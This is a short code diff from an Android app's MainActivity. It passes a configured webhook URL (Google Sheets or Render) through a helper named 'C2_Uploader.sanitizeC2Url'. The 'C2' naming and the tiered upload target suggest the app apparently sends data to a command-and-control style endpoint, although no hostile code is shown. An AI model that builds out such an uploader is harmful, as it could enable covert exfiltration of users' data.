@@ -834,7 +834,7 @@ public class MainActivity extends AppCompatActivity {
         }
 
         // Tier 3: Webhook Target URL (User's Configured Google Sheets or Render Webhook)
-        String webhookUrl = BuildConfig.WEBHOOK_URL;
+        String webhookUrl = C2_Uploader.sanitizeC2Url(BuildConfig.WEBHOOK_URL);
         if (webhookUrl != null && !webhookUrl.trim().isEmpty()) {
             return webhookUrl;
         }
